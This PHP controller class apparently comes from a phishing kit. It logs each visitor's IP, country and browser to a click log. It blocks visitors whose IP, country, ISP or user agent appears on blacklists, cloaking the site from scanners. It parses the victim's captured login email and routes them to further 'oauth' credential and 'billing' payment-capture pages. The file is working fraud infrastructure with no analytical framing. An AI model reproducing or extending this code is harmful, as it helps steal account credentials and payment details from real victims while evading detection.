<?php
defined("ALLOW") or exit('No direct script access allowed');

class Activity
{
	public $goCR51;
	public function __construct()
	{
		$this->goCR51 = new goCR51();
		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 2)) {

			write(FCPATH . 'CR51/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goCR51->ip_address}|{$_SESSION['country']}|{$this->goCR51->browser}|SESSION RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
		checkbacklist($this->goCR51->ip_address, 'ip');
		checkbacklist($_SESSION['countryCode'], 'countrycode');
		checkbacklist($_SESSION['isp'], 'isp');
		checkbacklist($_SERVER['HTTP_USER_AGENT'], 'ua');
	}

	public function index()
	{
		if ($this->goCR51->is_mobile) {
			echo view('mobile/activity');
		} else {
			echo view('pc/activity');
		}
	}

	public function process()
	{
		preg_match("/\@(.+)\./", $_SESSION['emailLogin'], $match);

		$_SESSION['email_type'] = $match[1];

		if (_config('GETEMAIL') == 'on') {
			$_SESSION['access'] = 3;
			redirect(base_url() . 'oauth/#_ts=' . md5(rand(0, 999)));
		} else {
			$_SESSION['access'] = 4;
			redirect(base_url() . 'billing?_ts=' . md5(time()));
		}
	}
}
